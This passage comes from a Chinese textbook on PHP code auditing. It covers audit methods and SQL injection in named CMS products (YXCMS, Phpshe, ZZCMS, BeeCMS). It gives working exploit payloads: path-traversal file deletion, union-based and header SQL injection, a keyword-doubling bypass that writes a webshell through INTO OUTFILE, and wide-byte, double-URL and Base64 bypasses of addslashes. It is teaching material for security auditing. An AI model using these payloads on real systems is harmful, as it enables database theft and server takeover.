本案例中该SQL语句的可控变量为“$id”，该变量通过语句“$id=!empty($_GET['id'])?intval($_GET['id']):'';”进行赋值，然后通过三目运算符确定GET方法传递的参数id是否为空，若不为空则使用intval进行整数转换。该行代码虽未用单引号进行闭合包含，但使用intval函数对传参进行保护，因此不存在SQL注入漏洞。本案例较为简单，并没有过多的函数调用与参数过滤，读者意在了解敏感函数参数回溯的思路。

### 2.4.3 定向功能分析法

程序开发过程中，一般都以功能模块为单位分配指定人员进行开发与维护。而作为安全人员在代码审计过程中，也可以根据程序的功能来审计功能点存在的漏洞，其分析过程如下：

（1）  安装并运行待审计程序。

（2）  对已安装程序进行熟悉，确定程序的功能列表、实现原理等。

（3）  对存在安全问题的常见功能点进行黑盒测试，确定功能存在的常见漏洞情况。

（4）  对有疑问或遗漏的功能点进行代码审计。

定向功能分析法的优劣：

l 优点：根据常见功能定位安全问题且配合黑盒测试，提升代码审计效率。

l 缺点：要求审计人员有一定经验，能够对常见功能模块存在的安全问题进行测试。

常见的功能漏洞主要包括：

l 程序初始安装

l 站点信息泄露

l 文件上传

l 文件管理

l 登录认证

l 数据库备份与恢复

l 找回密码

l 验证码

下面对容易出现安全漏洞的功能点进行介绍：

（1）  程序初始安装常见漏洞包括：

l 一般在PHP源码程序都有一个初始安装的功能，如果相关代码没有对参数进行严格过滤，可能会导致攻击者访问安装页面(install.php)或构造数据包，对网站进行重新安装，从而危害网站安全，甚至拿到服务器权限，将此漏洞称为“重装漏洞”。

（2）  站点信息泄露常见漏洞包括：

l 通过robots.txt泄露网站隐藏目录、文件、站点结构。

l 网站站点的备份文件未删除导致的泄露，可能会泄露网站源代码。

l 没有正确处理网站的一些错误消息，在错误消息中泄露数据库表、字段等。

（3）  文件上传功能常见漏洞包括：

l 后台程序对文件上传格式过滤不严格导致的任意文件上传漏洞。

l 对文件名过滤不严格导致的通过文件名进行SQL注入漏洞。

（4）  文件管理功能常见漏洞包括：

l 网站将文件名或文件路径作为参数进行传递，参数过滤不严格导致任意文件操作漏洞。

l 对管理文件名过滤不严格，导致JS恶意代码或SQL语句通过文件名存储到数据库中，形成存储型XSS漏洞或SQL注入漏洞。

（5）  登录认证功能常见漏洞包括：

l 通过查看网站登录用户的Cookie分析用户账户信息从而伪造网站认证令牌，或直接获得用户名等信息，造成越权漏洞。

l 对敏感功能点未进行token认证，从而造成CSRF漏洞。

（6）  数据库备份与恢复功能常见漏洞包括：

l 网站中对敏感参数过滤不严格且存在shell_exec函数，导致存在命令执行漏洞。

（7）  找回密码功能常见漏洞包括：

l 网站中四位验证码过期时间过长导致验证码爆破情况，从而获得非法权限。

l 找回密码业务逻辑过于简单导致的暴力破解用户密码情况。

### 2.4.4 实验：定向功能法分析YXCMS图片上传功能

· 实验介绍

本实验以YXCMS V1.4.7为例，使用定向功能法审计该网站的图片上传功能，让读者理解定向功能分析法的审计步骤，该案例审计的功能点如图2-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image156.jpg)

图2-11 定向功能分析法流程图

· 预备知识

参考2.4.3节：定向功能分析法。

· 实验目的

了解定向功能分析审计流程。

· 实验环境

Windows操作系统主机；YXCMS V1.4.7环境。

· 实验步骤

访问链接“http://ip/YXCMS/index.php?r=admin/index/index#”进入管理员后台页面，点击“内容管理”->“链接列表”->“编辑”按钮进入到本次实验分析的功能页面。使用BurpSuite拦截点击“选择文件”时发送的请求数据包，其发送的请求为“http://ip/YXCMS/index.php?r=admin/link/edit&id=3”。

   该请求将发送至后台代码protected\apps\admin\controller\linkController.php的edit方法中处理，通过分析可知该请求的核心代码如下：



if (empty($_FILES['picture']['name']) === false){

  $imgupload= $this->upload($this->uploadpath,config('imgupSize'),'jpg,bmp,gif,png');

  if(!empty($_POST['oldpicture'])){

​    **$picpath=$this->uploadpath.$_POST['oldpicture'];**

​    **if(file_exists($picpath)) @unlink($picpath);**

$imgupload->saveRule=substr($_POST['oldpicture'],0,strrpos($_POST['oldpicture'],'.'));

​    $imgupload->uploadReplace=true;//重名则覆盖}

​    $imgupload->upload();

​    $fileinfo=$imgupload->getUploadFileInfo();

​    $errorinfo=$imgupload->getErrorMsg();

​    if(!empty($errorinfo)) $this->alert($errorinfo);

​    $data['picture']=$fileinfo[0]['savename'];

​    $mes='logo已经上传，';}



代码流程为：

l 设置文件上传的路径、图片大小、后缀名，限制后缀名为jpg、bmp、gif、png。

l 判断原始图片文件$oldpicture变量是否为空，若不为空则判断该文件是否存在，若存在则进行删除；

l 设置新图片名称并进行上传。

上述代码接收的参数$oldpicture未经过校验，就直接用来删除文件。同时，参数$oldpicture还可通过BurpSuite拦截数据包进行修改。因此，用户可以通过篡改该变量造成任意文件删除漏洞。将拦截的参数$oldpicture修改为“../../robots.txt”从而删除了网站根路径下的robots.txt文件，如图2-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image158.jpg)

图2-12 定向功能分析法流程图

  至此，以上述案例演示了定向功能法的基本流程。通过分析CMS中图片上传功能，从而推测出该功能可能存在任意文件操作漏洞，然后审计该上传功能对应的代码并进行测试，最后得出结果。

### 2.4.5 通读全文法

通读全文法需要审计人员着重关注程序的文件、结构、功能。而不是将整个项目代码进行阅读，过于仔细的阅读代码将导致整套Web程序难以分析。在代码审计过程中有侧重点的关注部分代码，可以避免因代码量过大而导致的审计盲目。作为一名初学者，建议先从简单应用源码网站走读开始，或寻找网络上CTF代码审计的简单题目开始走读，先大体了解文件中代码流程，再有针对性的寻找敏感函数进行分析。最后再了解常见的CMS结构及PHP开源框架（例如：ThinkPHP、Yii、Zend Framework等）从而提升代码走读能力。

下面将从代码审计中通读全文法的优劣、方法、关键文件进行介绍。

1、通读全文法的优劣：

l 优点：更好的理解程序框架和业务逻辑，可以挖掘出更多高质量漏洞；

l 缺点：耗费时间精力，对熟悉代码走读的有经验者比较适合，对初学者难度较大。

2、通读全文法需要了解的内容：

l 程序的大体目录结构；

l 程序中主要目录文件的了解，例如：主目录、模块目录、插件目录；

l 程序中文件的大小及创建时间；

l 根据文件命名猜测程序可能实现的功能。

3、在进行程序目录结构概览时，通常需要注意以下关键点：

l 网站入口文件

网站的入口文件是每个程序的入口，常见的文件有：admin.php、index.php等。代码审计过程中应首先浏览网站目录中的index.php文件，从而对程序的架构、执行流程、包含的配置文件、包含的过滤文件有大致了解。

l 配置文件

通常文件名包含config关键字的文件，常见文件有：config.php等。此类文件中包括：数据库配置信息、程序运行配置信息等。代码审计过程中需查看数据库编码、若使用GBK编码则可能存在宽字节注入漏洞。同时，若配置条目的参数值使用了双引号，则可能存在双引号解析代码执行漏洞。

l 过滤功能

详细走读“公共函数文件”和“安全过滤文件”代码，需要完全掌握用户的输入数据在程序中的传递过程，主要关注点如下：

  用户输入参数中有哪些被程序过滤。

  程序中使用的过滤算法是什么。

  过滤算法是否存在漏洞造成绕过情况。

  整体程序中是否开启的GPC校验。

  用户输入参数是否采用addslashes函数过滤。

  用户输入参数的过滤方式是替换方式还是正则匹配方式。

l 网站的路由情况

网站的执行流程一般都是从前台页面传递数据，后台接收数据并处理。一般将从前台页面到后台代码处理的过程称为路由。进行代码审计前了解CMS的路由情况格外重要，只有对路由了解才能在发现漏洞后，分析如何利用该漏洞。通常分析路由情况方法包括：

  静态搜索：搜索包含“route”关键字的路由文件名称或路由方法。

  动态调试：发送一个HTTP请求，分析数据的处理流程，对路由情况进行了解。

### 2.4.6 实验：通读全文法分析74CMS案例

· 实验介绍

74CMS是一款基于PHP与MySQL为核心开发的一款开源的人才招聘系统。74CMS3.0版本发布就被安全审计人员发现漏洞。本实验使用通读全文法对该CMS进行代码审计，通读全文审计法需要对该程序中所有核心代码进行代码走读，本实验只对程序部分入口文件进行分析，意在使读者了解分析过程，请读者结合上节提出通读全文方法进行理解与总结。

· 预备知识

参考2.4.5节：通读全文法。

· 实验目的

掌握通读全文法需审计的重要文件；

了解通读全文法审计流程。

· 实验环境

Windows操作系统主机； 74CMS3.0环境。

· 实验步骤

（1）  了解程序的大体目录结构。

了解程序目录结构是代码审计初期的必备工作，其方法主要包括：

l 通过查阅程序功能说明文档了解文件功能。

l 通过文件名称了解CMS文件夹作用。

l 查看该文件夹下存放内容分析判断文件夹的含义。

经过分析可知74CMS目录结构如表2-1所示。

表2-1 74CMS文件目录结构

| **文件名**      | **文件作用**             | **文件属性**       |
| --------------- | ------------------------ | ------------------ |
| admin文件夹     | 存放后台管理员相关文件   | 主目录（需审计）   |
| data文件夹      | 在文件夹主要存放静态页面 | 无代码（可不审计） |
| api文件夹       | 接口设置文件夹           | 需审计             |
| include文件夹   | 包含全局文件             | 主目录（需审计）   |
| install文件夹   | 网站安装路径             | 可不审计           |
| templates文件夹 | 模板静态文件夹           | 可不审计           |
| user文件夹      | 用户代码核心模块         | 主目录（需审计）   |
| company文件夹   | 企业代码模块             | 主目录（需审计）   |
| jobs文件夹      | 职业代码模块             | 主目录（需审计）   |
| resume文件夹    | 简历代码模块             | 主目录（需审计）   |
| simple          | 微招聘代码模块           | 主目录（需审计）   |
| index.php文件   | 首页函数入口             | 主目录（需审计）   |
| 其他php文件     | 省略                     | 省略               |

（2）  对入口文件关键代码进行审计。

本小节对CMS中的部分公共函数、配置文件、安全过滤文件进行代码走读，从而对程序进一步了解。本节介绍部分通读全文审计流程，如图2-13所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image160.jpg)

图2-13 通读全文审计流程图

l index.php入口文件审计

基本所有的通读全文法都要从首页的index.php文件开始审计，流程为：

  该文件使用require_once函数包含两个文件：include/common.inc.php文件和include/mysql.class.php文件。

  判断当前页面是否存在缓存chaching，通过传递参数拼接为变量$cached_id。

  根据数据库的主机名、用户名、密码进行数据库连接，并根据$cached_id显示页面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image162.jpg)

图2-14 首页index.php文件代码

l common.inc.php通用函数文件审计

common.inc.php文件是通用函数集文件如图2-15所示，流程为：

  该文件包含三个文件：data/config.php文件、include/common.fun.php文件、include/74cms_version.php文件。

  使用addslashes_deep函数对GET、POST、COOKIE方法传递的参数进行过滤。

  定义该网站全局$_CFG变量，包括：图片上传目录、缩略图目录、简历照片等信息。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image164.jpg)

图2-15 common.inc.php文件代码

l common.fun.php通用函数文件审计

该文件包含了该CMS中的通用函数，其主要包括：

  addslashes_deep函数：该函数首先对传入的值进行检测，如果为空则退出。然后检查magic_quotes_gpc（魔术引号自动过滤函数）配置是否开启，如果没有开启则使用addslashes函数（PHP中过滤函数）将单引号、双引号、NULL字符和斜杠进行转义，如图2-16所示。

  mystrip_tags函数：，该函数将URL编码转换为对应符号，然后使用strip_tags函数进行字符过滤，通过mystrip_tags函数可防御XSS漏洞攻击。

  getip函数：将从HTTP头中获取IP地址参数，并对其使用正则匹配。该正则表达式只限制了IP地址的格式，虽然攻击者无法构造恶意攻击载荷进行SQL注入漏洞及XSS漏洞利用，但可能导致黑客通过伪造IP方式连接该Web网站。

  showmsg函数：该函数将传递参数$msg_detail、$msg_type、$links等显示到前台页面，若对该信息过滤不严，将导致XSS漏洞。

  get_smarty_request函数：该函数将对字符串进行URL解码，然后传参的数值进行处理，由于对其传参进行URL解码，则可能导致二次注入的情况。

  inserttable函数、updatetable函数、wheresql函数：与数据库操作相关函数。

  htmldecode函数、cut_str函数：与字符串过滤编码相关的过滤函数。

  smtp_mail函数、asyn_sendmail函数：设置邮箱参数与发送邮箱的函数。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image166.jpg)

图2-16 common.fun.php文件addslashes_deep函数代码

l mysql.class.php通用函数文件审计

该文件定义了一个mysql类，其主要用来实现数据库的连接、操作、管理等，例如：query方法（查询方法）、getone（返回一条记录）、getall（返回所有记录等方法）。代码审计过程中，需关注数据库的连接使用的编码、数据库的参数过滤。该CMS使用了GBK编码连接数据库，将绕过addslashes函数，发生宽字节SQL注入漏洞。图2-17代码为自定义数据库连接函数connect，该函数首先判断数据库是否能进行连接，连接成功则判断数据库版本是否大于4.1，如果大于4.1则设置数据库查询为GBK编码。所以，该CMS存在宽字节SQL注入漏洞（该漏洞攻击方式将在SQL注入审计单元中进行介绍）。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image168.jpg)

图2-17 mysql.class.php文件代码

至此，本节给出了74CMS3.0的部分入口文件的代码审计流程。而通读全文法还需对所有核心代码文件、配置文件等进行走读。

## 2.5 单元小结

本单元对代码审计前导进行介绍，使读者能够熟悉代码审计相关的配置与函数。对于代码审计而言，需要对PHP的代码及配置有一定的基础，才能对各种CMS进行详细的审计。本单元首先列出常见的PHP配置，然后对PHP代码中查常见漏洞的敏感函数进行列举。最后，给出三种代码审计思路：敏感函数参数回溯、定向功能分析、通读全文法，并对这三种方法给出对应实验练习。



 

# 单元3 SQL注入漏洞审计

**单元概述：**

本单元介绍了代码审计中最常见的SQL注入漏洞审计。

第一部分主要介绍SQL注入漏洞的基础知识，包括：SQL注入漏洞简介、SQL注入漏洞分类、挖掘经验。

第二部分主要介绍CMS案例中三种SQL注入漏洞代码审计，包括：无过滤参数SQL注入、无过滤HTTP头SQL注入、绕过字符串替换SQL注入。

第三部分介绍绕过addslashes的注入方法：宽字节注入、解码注入、字符串替换等。

第四部分介绍了SQL注入的防御函数，包括：GPC、PHP通用防御函数、PDO预编译防御机制等。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image170.jpg)

**单元目标：**

\1. 熟悉SQL注入漏洞的简介及分类；

\2. 了解SQL注入漏洞的挖掘技巧；

\3. 掌握各类SQL注入漏洞的代码审计方法；

\4. SQL注入漏洞的基本防御方法。

## 3.1 SQL注入漏洞挖掘

### 3.1.1 SQL注入漏洞简介

SQL注入攻击（SQL Injection）简称SQL注入，是代码审中比较重视的漏洞之一，SQL注入产生的原因是程序未有效过滤输入内容，导致攻击者向服务器提交恶意的SQL语句，并拼接到程序原有的SQL语句中，使原始SQL语句逻辑被改变，最终执行了攻击者精心构造的恶意代码。

### 3.1.2 SQL注入漏洞分类概述

本小节将介绍SQL注入漏洞类型。

  （1）按数据类型分类

SQL注入按照数据类型分为数字型注入和字符型注入。注入点数据类型为数字时为数字型注入，注入点数据为字符型时为字符型注入。

（2）按返回信息分类

SQL注入按照服务器返回信息是否显示分为报错注入和盲注。在注入的过程中，程序将获取的信息直接显示于页面为报错注入；程序不显示任何SQL报错信息，攻击者通过构造SQL语句，根据页面是否正常返回或返回时间判断注入，这样的注入称为盲注。

（3）按注入点分类

SQL注入按照HTTP请求中数据提交方式不同划分为GET型注入、POST型注入、Cookie注入、HTTP头注入等。由于HTTP请求头中参数注入位置不同，划分为：Cookie注入、Referer注入、X-forward-for注入等。

（4）编码问题导致的SQL注入

程序会进行一些编码处理，编码问题是通过输入不兼容的特殊字符，导致输出字符被错误解码并进行利用。在SQL注入漏洞中，编码问题导致的漏洞分为：宽字节注入、二次UrlCode编码注入。图3-1为SQL注入漏洞分类。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image172.jpg)

图3-1 SQL注入分类图

### 3.1.3 SQL注入漏洞挖掘经验

代码审计中SQL注入的盲点包括：

1、GET方式传递的数字型参数会无视magic_quotes_gpc过滤（简称“GPC过滤”）并绕过addslashes函数。数字型SQL注入漏洞如下：

l 数字型参数不加单引号保护；

l 数字型参数未使用intval函数保护；

2、 注入点是键值对，函数只对值进行过滤，未对键进行过滤。

过滤函数先判断GPC是否开启，如果未开启对值进行addslashes过滤，恶意代码通过键带入到SQL语句中。

3、全局过滤时，只过滤GET、POST、COOKIE，未过滤SERVER变量。常见SERVER变量（危险变量）包括：QUERY_STRING，X_FORWARDED_FOR，CLIENT_IP，HTTP_HOST，ACCEPT_LANGUAGE。漏洞如下：

l 获取用户IP并将变量X_FORWARDED_FOR存入数据库。

l 检测IP的正则表达式可被绕过。

4、FILES注入，全局只转义GET、POST传递的参数，而遗漏FILES参数过滤。

l 通过上传的名字通过Insert语句带入数据库造成FILES注入；

l 将文件名的转义存入数据库，却没有对其后缀转义导致FILES注入。

除上述介绍的注入经验外，代码审计还可通过查找关键字快速挖掘注入漏洞，例如：select from、mysql_connect、mysql_query、mysql_fetch_row等。

## 3.2 SQL注入分类

本节介绍CMS案例中的三种SQL注入：无过滤参数注入、无过滤HTTP头注入、字符串替换绕过注入。

### 3.2.1  无过滤参数注入

本小节主要介绍SQL注入中的无过滤参数注入进行介绍，该类型注入方式的关注点在于HTTP请求参数传递过程中数据的类型。此类漏洞的利用方式也大多以union select方式获取数据库数据或写入木马文件为主（部分书籍将其称之为union注入），为能够让读者理解漏洞注入代码从而打好代码审计基础，本节将给出该类型漏洞经典代码案例。

（1）  案例分析

Phpshe V1.5版本中存在无过滤的SQL注入漏洞，在\module\admin\moneylog.php文件的第10-11行中，变量$g_user_name与$g_type直接拼接到SQL语句中，其代码如下：



$menumark = 'moneylog';

switch ($act) {

  default:

​    **$_g_user_name && $sql_where .= " and `user_name` like '%{$_g_user_name}%'";**

​    **$_g_type && $sql_where .= " and `moneylog_type` = '{$_g_type}'";**

​    **$sql_where .= ' order by moneylog_id desc';**

​    $info_list = $db->pe_selectall('moneylog', $sql_where, '*', array(50, $_g_page));

​    $tongji['all'] = $db->pe_num('moneylog');

​    $seo = pe_seo($menutitle='资金明细');

​    include(pe_tpl('moneylog_list.html'));

  break;

}



审计参数$_g_user_name与$_g_type是否进行安全过滤。对此参数进行敏感函数回溯，发现在phpshe1.5\common.php中进行了GET和POST的变量创建，其代码如下：



if (get_magic_quotes_gpc()) {

  !empty($_GET) && **extract**(**pe_trim(pe_stripslashes($_GET))**, EXTR_PREFIX_ALL, '_g');

  !empty($_POST) && **extract**(**pe_trim(pe_stripslashes($_POST))**, EXTR_PREFIX_ALL, '_p');}

else {

  !empty($_GET) && extract(**pe_trim($_GET)**,EXTR_PREFIX_ALL,'_g');

  !empty($_POST) && extract(**pe_trim($_POST)**,EXTR_PREFIX_ALL,'_p');}



上述代码流程为：

l 判断网站是否开启了GPC，若开启则调用pe_stripslashes函数对参数删除反斜杠。

l 若未开启组调用pe_trim函数对参数首尾去空格。

l 调用extract函数创建变量，未对变量进行安全处理，因此存在SQL注入漏洞。

（2）漏洞利用

http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t)' union select 1,2,3,4,5,6,(database()),8,(user()) %23&type=111，直接通过union注入获取都数据库名称与用户名称，执行结果如图3-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image174.gif)

图3-2 Union SQL注入效果图

### 3.2.2  无过滤HTTP头注入

对于代码审计而言，早期CMS程序在开发时，有时候会使用全局过滤只过滤掉GET、POST和COOKIE，但未过滤SERVER等变量，这将导致SERVER注入的发生。常见的SERVER变量（危险变量）包括：QUERY_STRING，X_FORWARDED_FOR，CLIENT_IP，HTTP_HOST，ACCEPT_LANGUAGE。

（1）案例分析

ZZCMS V8.2版本中出现过HTTP头中参数值无过滤导致的SQL注入漏洞。在\zzcms\zzcms8.2\user\check.php文件中执行SQL语句的时候，其使用了getip函数获取登录IP然后拼接到SQL中。代码如下：



**$ip=getip();      //调用getip函数获取ip地址赋值给$ip变量**

define('trytimes',50); //可尝试登录次数

define('jgsj',15*60); //间隔时间，秒

**$sql="select \* from zzcms_login_times where ip='$ip' and count>='".trytimes."' and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";**

$rs = query($sql);   //查询显示内容

$row= num_rows($rs);

if ($row){

$jgsj=jgsj/60;

showmsg("密码错误次数过多，请于".$jgsj."分钟后再试！");

}



但是在\zzcms\zzcms8.2\inc\function.php文件的getip方法的代码中，该方法流程：

l 通过getenv()获取指定HTTP头信息，通过strcasecmp()来进行字符串比较。

l 如果指定HTTP头的长度比字符串unknown大，就返回大于0的值，然后直接赋值给变量ip。（简而言之，就是没有任何过滤）。

l 直接带入变量ip并返回并没有对传入的IP进行合规判断，又将方法的结果返回到调用的位置，所以此处存在SQL注入，经过分析发现有多处使用了getip方法与数据进行拼接，所以还有许多漏洞等待挖掘。



function **getip()**{                    //getip函数定义

if (**getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")**)

**$ip = getenv("HTTP_CLIENT_IP");** 

else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 

$ip = getenv("HTTP_X_FORWARDED_FOR"); 

else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 

$ip = getenv("REMOTE_ADDR"); 

else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 

$ip = $_SERVER['REMOTE_ADDR']; 

else 

$ip = "unknown"; 

**return($ip);**

}



（2）漏洞利用

使用BurpSuite拦截正常网站的请求，其注入点可以有多个，包括：HTTP_CLIENT_IP**、**HTTP_X_FORWARDED_FOR、REMOTE_ADDR。当设置HTTP头中X_FORWARDED_FOR的值为“192.168.2.108’ and 1=2#”时将成功注入SQL，数据库监控效果如图3-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image176.jpg)

图3-3 SQL执行监控图

### 3.2.3  字符串替换绕过注入

本节介绍SQL注入中对于关键字进行过滤的绕过方法。在很多CMS中为了防御SQL注入都会为传递参数设置自定义过滤函数，从而对敏感字符进行替换。这时可以针对其正则表达式进行分析，从而绕过过滤函数完成SQL注入。常见绕过方法通常有：双写、大小写、编解码等。

（1）案例分析

BeeCMS V4.0_R版本中出现过可以绕过全局防护函数的SQL注入漏洞，其主要原因就时全局过滤函数不严格导致的。该网站的登陆功能\admin\login.php文件代码如下：



//判断登录

elseif($action=='ck_login'){

​    global $submit,$user,$password,$_sys,$code;

​    $submit=$_POST['submit'];

​     **$user=fl_html(fl_value($_POST['user']));**

​     **$password=fl_html(fl_value($_POST['password']));**

​    $code=$_POST['code'];

​    if(!isset($submit)){

​        msg('请从登陆页面进入');}

​    if(empty($user)||empty($password)){

​        msg("密码或用户名不能为空");}

​    if(!empty($_sys['safe_open'])){

​        foreach($_sys['safe_open'] as $k=>$v){

​        if($v=='3'){

​            if($code!=$s_code){msg("验证码不正确！");}}}}

​    check_login($user,$password);

}



上述代码的主要流程为：

l 获取参数submit、user、password、code；

l 对变量user、password使用fl_value函数和fl_html函数进行过滤；

l 判断用户名密码不能为空，且验证码正确；

l 调用check_login函数进行登录验证。

因此，需要对fl_value函数、fl_html函数、check_login函数进行审计，代码如下：



// **fl_value****函数代码**

function **fl_value**($str){

​    if(empty($str)){return;}

​    **return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file|outfile/i','',$str);//****将关键字或正则表达式符合的字符串替换为空**

**}**

// **fl_html****函数代码**

function **fl_html**($str){

​    return htmlspecialchars($str);//对字符串进行HTML转码

}

**//check_login函数代码**

function **check_login**($user,$password){

​    $rel=$GLOBALS['mysql']->fetch_asc("**select id,admin_name,admin_password,admin_purview,is_disable from ".DB_PRE."admin where admin_name='".$user."' limit 0,1**"); 

​    $rel=empty($rel)?'':$rel[0];

​    if(empty($rel)){

​        msg('不存在该管理用户','login.php');

​    }…省略…



通过对上述代码进行审计，可以得出以下结论：

l fl_value函数、fl_html函数可以通过双写绕过防御函数。

l check_login函数中将用户名和密码参数直接拼接为SQL语句执行。

（2）漏洞利用

fl_value函数可以使用双写敏感字符串的方式绕过，例如：对于select关键字可使用“selselectect”、对于union关键字可以使用“uni union on”等。下面给出向服务器写入木马的Payload，如下：



user=admin' **uni union on** **selselectect** 1,2,3,4,5 '' in into **outoutfilefile** 'D: /phpStudy/PHPTutorial/WWW/beecms/a.php' --%20



## 3.3 SQL注入绕过addslashes

### 3.3.1  宽字节注入绕过

为了防御SQL注入攻击，程序一般将用户输入数据用addslashes等函数进行过滤。addslashes函数在预定义字符之前添加反斜杠\（预定义字符包括：单引号、双引号、反斜杠、NULL）。但该函数虽然会添加反斜杠\进行转义，但是\并不会插入到数据库中。注意：addslashes函数的功能和魔术引号完全相同，可以使用get_magic_quotes_gpc()函数检测是否开启魔术引号。

宽字节注入可以在编码设置不合理的情况下绕过防御函数addslashes。该漏洞产生的主要原因是MySQL使用GBK编码时，如果第一个字符ASCII编码大于128，MySQL则会认为前两个字符是一个汉字，会将后面的转移字符\“吃掉”，并将前两个字符拼接为汉字，这样就可以将SQL语句闭合并造成宽字节注入。

例如：输入的请求路径为http://192.168.0.10/?id=1%81’。其中参数为id=1%81’，经过addslashes过滤后单引号被转义，其参数变为id=1%81\’。由于%81是URL编码器对应的ASCII编码大于128，且若MYSQL使用GBK编码，则将“%81\”当做一个中文汉字“乗”，被解析后结果为“1乗”从而将转移字符覆盖掉成功绕过过滤函数addslashes。

宽字节注入中常用的ASCII大于128的URL编码有%81、%df等。PHP代码连接数据库时很多配置文件会使用“set character_set_client=gbk”设置数据编码为GBK。除上述关键字外，其他宽字节漏洞挖掘时需注意的关键字还包括：SET NAME、mysql_set_charset('gbk')。

（1）下面给出宽字节注入的案例代码：



<?php

//连接数据库部分，注意使用了gbk编码

$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');//连接数据库

mysql_query("SET NAMES '**gbk**'");          //设置MySQL字符集为GBK编码

mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");

$id = isset($_GET['id']) ? **addslashes**($_GET['id']) : 1;

$sql = "SELECT * FROM news WHERE tid='{$id}'";

$result = mysql_query($sql, $conn) or die(mysql_error());  //执行sql语句

?>



（2）分析漏洞：

上述代码使用“mysql_query("SET NAMES '**gbk**'");”设置了MySQL服务器数据编码为GBK，同时通过GET方式传递的参数id被addslashes函数进行过滤保护，存在宽字节注入漏洞。

（3）利用方法：

测试宽字节漏洞：http://192.168.0.10/sqli-labs-master/0x01/?id=-1%81’。若该页面显示如图3-4所示，则存在宽字节注入漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image178.jpg)

图3-4 宽字节报错图

获取数据库名称：http://192.168.0.10/?id=-1%81%27union%20select%201,group_concat(table_name),3%20from%20inFORMation_schema.tables%20where%20table_schema=0x74657374%23。请求后查看用户及数据库信息如图3-5所示，数据库test下存在表admin和news。

注意：0x74657374是数据库名称test的16进制转换后结果，这种写法主要是因为如果输入table_schema=’test’则其中单引号会被addslashes转义导致语法错误。只有将test转换为16进制才能够执行，MySQL可以正常处理16进制字符串。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image180.jpg)

图3-5 宽字节利用图

### 3.3.2  解码注入绕过

解码注入绕过addslashes的情况，包括：二次url编码绕过、base64编码绕过、Json编码绕过等。其原理是向程序发送编码后的参数从而绕过addslashes检测机制，后台程序对参数解码并拼接SQL语句执行。

1、二次URL解码绕过

如果Web程序对参数使用urldecode或rawurldecode函数进行URL编码，则可能导致二次解码生成单引号从而引起SQL注入漏洞。二次URL解码注入可绕过GPC保护、addslashes()、mysql_real_escape_string()、mysql_escape_string()函数进行注入攻击。

二次URL解码注入原理：假设提交请求路径为“/1.php?id=1%2527”，服务器接收到该请求后自动进行一次URL解码，解码后结果为“/1.php?id=1%27”（%25的URL解码结果是%）。然后，程序中调用urldecode函数第二次对请求进行URL解码，解码后结果为“/1.php?id=1’”，单引号被成功解码并拼接SQL语句。

下面给出宽字节注入的案例代码：



<?php

$a=addslashes($_GET['p']);  //对参数p的值进行addslashes过滤

$b=urldecode($a);      //对变量$a进行URL解码

echo '$a='.$a;        //打印第一次URL解码值

echo '<br />';

echo '$b='.$b;        //打印第二次URL解码值

?>



  发送HTTP请求为“http://192.168.0.10/2urlcode.php?p=1%2527”请求响应结果分别显示第一次解码结果$a=1%27，第二次解码结果为$b=1’，如图3-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image182.jpg)

图3-6 二次URL解码利用图

2、Base64解码绕过

Base64编码绕过与二次URL解码绕过原理类似，由于程序中存在Base64解码函数，因此对请求参数先进行Base64编码后再传递处理，从而绕过addslashes函数过滤。（例如：admin使用Base64编码后结果为YWRtaW4nICM=）。

（1）以登陆功能为案例，给出Base64解码绕过代码：



<?php

$link = mysql_connect('localhost', 'root', 'root') or die('bad!');

mysql_query("SET NANES 'gbk'");

mysql_select_db("test",$link);

$username=$_REQUEST['username'];

**$username=addslashes($username);      //使用addslashes函数进行转义**

**$username=base64_decode($username);     //对参数username进行Base64解码**

$password=md5($_REQUEST ['password']);   //对密码进行md5加密

**$sql="select count(\*) as num from admin where name='".$username."' and pass='".$password.".";           //拼接sql语句**

$query=mysql_query($sql);

$res=mysql_fetch_array($query);

$count=$res['num'];

if($count==1){echo "login success";}else{echo "login failed";}?>



（2）利用方法：

预拼凑的SQL语句为“select count(*) as num from admin where name=’admin’# ' and pass='$password’”。因此，$username参数值为“admin’#”，对其进行Base64编码为“YWRtaW4nICM=”。

发送请求为：

 http://192.168.0.10 /index3.php?username=YWRtaW4nICM=&password=test

请求发送至服务器端后“YWRtaW4nICM=”经过addslashes过滤后未发生变化，Base64解码后为admin’#。该参数值传递至SQL语句执行，显示“login success”，如图3-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image184.jpg)

图3-7 Base64编码绕过图

使用Seay审计工具监控数据库执行结果如图3-8所示。

